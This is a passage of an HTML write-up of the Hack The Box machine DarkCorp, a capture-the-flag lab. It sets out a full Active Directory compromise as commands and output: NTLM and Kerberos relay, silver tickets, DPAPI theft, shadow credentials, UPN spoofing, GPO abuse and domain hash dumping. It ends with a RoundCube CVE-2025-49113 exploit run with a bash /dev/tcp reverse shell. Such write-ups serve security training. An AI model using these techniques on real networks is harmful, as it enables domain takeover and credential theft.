+<p>The Net-NTLMv2 hash won't crack, but BloodHound shows <code>svc_acc</code> is a member of <strong>DNSADMINS</strong> — they can create/modify DNS records.</p>
+
+<h3 id="silver-ticket">DNS Relay + Printer Bug → Silver Ticket</h3>
+<p>The attack chain combines three techniques:</p>
+<ol>
+  <li><strong>DNS record creation via NTLM relay</strong> — Relay <code>svc_acc</code>'s auth to LDAP and create a fake DNS record pointing to our IP</li>
+  <li><strong>Printer Bug coercion</strong> — Force <code>WEB-01$</code> to authenticate to our DNS name</li>
+  <li><strong>Kerberos relay to ADCS</strong> — Relay the machine account's Kerberos auth to the certificate enrollment endpoint</li>
+</ol>
+
+<div class="callout callout-info">
+  <div class="callout-title">Info — DNS Record Trick</div>
+  <p>To relay Kerberos, we need a DNS name that the DC will recognize as <code>DC-01</code>. The trick from the Synactiv post appends a <code>CREDENTIAL_TARGET_INFORMATION</code> structure to the hostname: <code>dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA</code></p>
+</div>
+
+<p>Step 1 — Create the DNS record by relaying <code>svc_acc</code>'s NTLM to LDAP:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ proxychains ntlmrelayx.py -t 'ldap://172.16.20.1' \
+    --add-dns-record 'dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 10.10.14.8
+[*] Added A record dc-011UWhR... pointing to 10.10.14.8</code></pre>
+</div>
+
+<p>Step 2 — Set up Kerberos relay targeting the ADCS web enrollment:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ proxychains krbrelayx.py \
+    -t 'https://dc-01.darkcorp.htb/certsrv/certfnsh.asp' \
+    --adcs -v 'WEB-01$'
+[*] GOT CERTIFICATE! ID 5
+[*] Writing PKCS#12 certificate to ./WEB-01$.pfx</code></pre>
+</div>
+
+<p>Step 3 — Trigger printer bug to coerce <code>WEB-01$</code> into authenticating to us:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ proxychains printerbug.py 'darkcorp/victor.r:victor1gustavo@#@WEB-01.darkcorp.htb' \
+    dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
+[*] Triggered RPC backconnect</code></pre>
+</div>
+
+<p>Step 4 — Authenticate with the certificate and forge a silver ticket:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ proxychains certipy auth -pfx 'WEB-01$.pfx' -domain darkcorp.htb -dc-ip 172.16.20.1
+[*] Got hash for 'web-01$@darkcorp.htb': aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675
+
+$ proxychains lookupsid.py -hashes :8f33c7fc7ff515c1f358e488fbb8b675 \
+    'darkcorp.htb/WEB-01$@DC-01.darkcorp.htb'
+[*] Domain SID is: S-1-5-21-3432610366-2163336488-3604236847
+
+$ ticketer.py -nthash 8f33c7fc7ff515c1f358e488fbb8b675 \
+    -domain darkcorp.htb \
+    -domain-sid S-1-5-21-3432610366-2163336488-3604236847 \
+    -spn cifs/web-01.darkcorp.htb Administrator</code></pre>
+</div>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ KRB5CCNAME=Administrator.ccache proxychains evil-winrm-py -i web-01 -u administrator -H 88d84ec08dad123eb04a060a74053f21
+evil-winrm-py PS C:\Users\Administrator\Desktop> cat user.txt
+da2e66e0************************</code></pre>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="auth-john">Auth as john.w@darkcorp.htb</h2>
+
+<h3 id="schtasks-dpapi">Scheduled Tasks → DPAPI Creds</h3>
+<p>WEB-01 has a scheduled task <code>CleanupScript</code> running <code>cleanup.ps1</code> every 2 minutes as the local <code>Administrator</code>. The <code>CredentialManager</code> PowerShell module is installed, meaning credentials are stored via DPAPI.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell">PS> Get-ScheduledTask | ? {$_.State -ne "Disabled"} | Select TaskName, @{N="User";E={$_.Principal.UserId}} | ft -a
+
+TaskName          User
+--------          ----
+CleanupScript     Administrator
+HTB-Stability     SYSTEM</code></pre>
+</div>
+
+<p>Since the scheduled task runs as the Administrator, the DPAPI master keys can be decrypted using the machine context. Both DonPAPI and <code>nxc --dpapi</code> extract the stored credential:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ KRB5CCNAME=Administrator.ccache proxychains DonPAPI collect -k --no-pass -t WEB-01.darkcorp.htb
+[WEB-01] [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:... - WEB-01\Administrator:But_Lying_Aid9!</code></pre>
+</div>
+
+<p>Running with the Administrator password to access the user DPAPI context reveals a second stored credential:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ proxychains nxc smb 172.16.20.2 -u administrator -p 'But_Lying_Aid9!' --local-auth --dpapi
+[Administrator][CREDENTIAL] LegacyGeneric:target=WEB-01 - Administrator:Pack_Beneath_Solid9!</code></pre>
+</div>
+
+<h3 id="password-spray">Password Spray</h3>
+<p>Spraying <code>Pack_Beneath_Solid9!</code> across all domain users:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ proxychains nxc smb 172.16.20.1 -u users.txt -p 'Pack_Beneath_Solid9!' --continue-on-success
+SMB  172.16.20.1  445  DC-01  [+] darkcorp.htb\john.w:Pack_Beneath_Solid9!</code></pre>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="auth-angela">Auth as angela.w@darkcorp.htb</h2>
+
+<h3 id="shadow-cred">Shadow Credential Attack</h3>
+<p>BloodHound shows <code>john.w</code> has <code>GenericWrite</code> over <code>angela.w</code>. This is enough to perform a Shadow Credential attack — adding a Key Credential to the target object and then authenticating with it:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ proxychains certipy shadow auto -username john.w -p 'Pack_Beneath_Solid9!' \
+    -account angela.w -target dc-01.darkcorp.htb
+[*] Successfully added Key Credential
+[*] Got TGT
+[*] NT hash for 'angela.w': 957246c8137069bca672dc6aa0af7c7a</code></pre>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="shell-angela-adm">Shell as angela.w.adm@drip</h2>
+
+<h3 id="upn-spoof">UPN Spoofing</h3>
+<p>BloodHound shows <code>angela.w.adm</code> is a member of <strong>Linux Admins</strong> — an interesting target for the Linux host. The trick is that <code>angela.w</code> and <code>angela.w.adm</code> are separate AD accounts, but by abusing UPN Spoofing (as described by Pen Test Partners), we can make the KDC issue a ticket that the Linux SSSD client interprets as <code>angela.w.adm</code>.</p>
+
+<p>The attack: set <code>angela.w</code>'s <code>userPrincipalName</code> to <code>angela.w.adm</code>, then request a TGT with <code>NT_ENTERPRISE</code> principal type so the UPN is used:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ proxychains bloodyAD -d darkcorp.htb -H dc-01 -u john.w -p 'Pack_Beneath_Solid9!' \
+    set object angela.w userPrincipalName -v angela.w.adm
+[+] angela.w's userPrincipalName has been updated
+
+$ proxychains getTGT.py -hashes :957246c8137069bca672dc6aa0af7c7a \
+    -principalType 'NT_ENTERPRISE' darkcorp.htb/angela.w.adm
+[*] Saving ticket in angela.w.adm.ccache</code></pre>
+</div>
+
+<p>Transfer the ccache to the Linux host and authenticate with <code>ksu</code>:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">ebelford@drip:~$ KRB5CCNAME=angela.w.adm.ccache ksu angela.w.adm
+Authenticated angela.w.adm@DARKCORP.HTB
+Account angela.w.adm: authorization for angela.w.adm@DARKCORP.HTB successful
+angela.w.adm@drip:~$</code></pre>
+</div>
+
+<div class="callout callout-warn">
+  <div class="callout-title">Warning</div>
+  <p>A cleanup script periodically removes the UPN from <code>angela.w</code>. If <code>ksu</code> fails with "TGT has been revoked", re-add the UPN and get a fresh ticket.</p>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="shell-root-drip">Shell as root@drip</h2>
+<p><code>angela.w.adm</code> has full sudo privileges:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">angela.w.adm@drip:~$ sudo -l
+User angela.w.adm may run the following commands on drip:
+    (ALL : ALL) NOPASSWD: ALL
+
+angela.w.adm@drip:~$ sudo -i
+root@drip:~#</code></pre>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="shell-taylor-adm">Shell as taylor.b.adm@DC-01</h2>
+
+<h3 id="sssd-cache">SSSD Cached Credentials</h3>
+<p>The Linux host uses SSSD for AD authentication with <code>cache_credentials = True</code>. The cached password hashes are stored in <code>/var/lib/sss/db/</code>:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">root@drip:/var/lib/sss/db# ldbsearch -H cache_darkcorp.htb.ldb '(cachedPassword=*)'
+name: taylor.b.adm@darkcorp.htb
+cachedPassword: $6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.</code></pre>
+</div>
+
+<p>The SHA-512 crypt hash cracks with hashcat:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ hashcat -m 1800 taylor.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
+$6$5wwc6mW6nrcRD4Uu$9rigmpKLy...:!QAZzaq1</code></pre>
+</div>
+
+<p>Domain verification:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ proxychains nxc winrm 172.16.20.1 -u taylor.b.adm -p '!QAZzaq1'
+WINRM  172.16.20.1  5985  DC-01  [+] darkcorp.htb\taylor.b.adm:!QAZzaq1 (Pwn3d!)
+
+$ proxychains evil-winrm-py -i dc-01 -u taylor.b.adm -p '!QAZzaq1'
+evil-winrm-py PS C:\Users\taylor.b.adm\Documents></code></pre>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="shell-dc01">Shell as Administrator@DC-01</h2>
+
+<h3 id="gpo-abuse">GPO Abuse</h3>
+<p><code>taylor.b.adm</code> is a member of <code>gpo_manager</code>, which has <code>GenericWrite</code> on the <strong>SecurityUpdates</strong> GPO. This GPO is linked to the domain and applies to all machines.</p>
+
+<p>SharpGPOAbuse gets blocked by AMSI, so the Python-based <code>pyGPOabuse</code> is the way to go:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ proxychains pygpoabuse.py 'darkcorp.htb/taylor.b.adm:!QAZzaq1' \
+    -gpo-id 652CAE9A-4BB7-49F2-9E52-3361F33CE786 \
+    -command 'net localgroup administrators taylor.b.adm /add' \
+    -f
+[+] ScheduledTask TASK_0b270770 created!</code></pre>
+</div>
+
+<p>After <code>gpupdate /force</code> (or waiting for the next refresh), <code>taylor.b.adm</code> becomes a local administrator on DC-01. Now we can dump the entire domain:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ proxychains secretsdump.py 'darkcorp.htb/taylor.b.adm:!QAZzaq1@dc-01'
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:fcb3ca5a19a1ccf2d14c13e8b64cde0f:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7c032c3e2657f4554bc7af108bd5ef17:::
+...</code></pre>
+</div>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ proxychains evil-winrm-py -i dc-01 -u administrator -H fcb3ca5a19a1ccf2d14c13e8b64cde0f
+evil-winrm-py PS C:\Users\Administrator\Desktop> cat root.txt
+2dc68348************************</code></pre>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="beyond-root">Beyond Root</h2>
+
+<h3 id="cve-2025-49113">CVE-2025-49113 — RoundCube Post-Auth RCE</h3>
+<p>After the box retired, a new critical RCE was disclosed for RoundCube ≤ 1.6.10. The vulnerability is a PHP object deserialization via the <code>_from</code> parameter in <code>settings/upload.php</code>.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ php CVE-2025-49113.php http://mail.drip.htb qa210 qa210 'ping -c 1 10.10.14.8'
+### Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization [CVE-2025-49113]
+### Authentication successful
+### Command to be executed: ping -c 1 10.10.14.8
+### Exploit executed successfully</code></pre>
+</div>
+
+<p>ICMP confirmation:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ sudo tcpdump -ni tun0 icmp
+21:27:25.865542 IP 10.10.11.54 > 10.10.14.8: ICMP echo request, id 1000, seq 1, length 64</code></pre>
+</div>
+
+<p>Reverse shell variant:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ php CVE-2025-49113.php http://mail.drip.htb qa210 qa210 \
+    'bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"'
+
+$ nc -lvnp 443
+www-data@drip:/var/www/roundcube$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+</div>
+
+<p>This gets <code>www-data</code> instead of <code>postgres</code>, but from there the same escalation path applies — the PostgreSQL service is accessible and the same RCE techniques work.</p>
+
+<!-- ═══ FOOTER ═══ -->
+</main>
+</div>
+
+<footer class="site-footer">
+  <p>&copy; 2025 QA210 — Hack The Box Writeups &nbsp;·&nbsp; DarkCorp — Insane</p>
+</footer>
+
+<script>
+// ── Copy Button ──────────────────────────────
+function copyCode(btn) {
+  const code = btn.closest('.code-block-wrapper').querySelector('code');
+  navigator.clipboard.writeText(code.textContent).then(() => {
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+
+// ── Build TOC ────────────────────────────────
+function buildToc() {
+  const headings = document.querySelectorAll('.main-content h2, .main-content h3');
+  const tocD = document.getElementById('tocDesktop');
+  const tocM = document.getElementById('tocMobile');
+  let html = '';
+  headings.forEach(h => {
+    if (!h.id) h.id = h.textContent.toLowerCase().replace(/[^a-z0-9]+/g,'-').replace(/(^-|-$)/g,'');
+    const cls = h.tagName === 'H3' ? 'toc-h3' : '';
+    html += `<li><a href="#${h.id}" class="${cls}" data-target="${h.id}">${h.textContent}</a></li>`;
+  });
+  tocD.innerHTML = html;
+  tocM.innerHTML = html;
+}
+buildToc();
+
+// ── Active Section Tracking ──────────────────
+function trackActiveSection() {
+  const links = document.querySelectorAll('#tocDesktop a, #tocMobile a');
+  const headings = document.querySelectorAll('.main-content h2, .main-content h3');
+  const observer = new IntersectionObserver(entries => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) {
+        links.forEach(l => l.classList.remove('active'));
+        document.querySelectorAll(`[data-target="${entry.target.id}"]`).forEach(l => l.classList.add('active'));
+      }
+    });
+  }, { rootMargin: '-80px 0px -70% 0px', threshold: 0 });
+  headings.forEach(h => observer.observe(h));
+}
+trackActiveSection();
+
+// ── Mobile TOC Toggle ────────────────────────
+function toggleMobileToc() {
+  document.getElementById('tocOverlay').classList.toggle('show');
+  document.getElementById('tocMobilePanel').classList.toggle('show');
+}
+
+// Close mobile TOC on link click
+document.getElementById('tocMobile').addEventListener('click', e => {
+  if (e.target.tagName === 'A') toggleMobileToc();
+});
+</script>
+</body>
+</html>
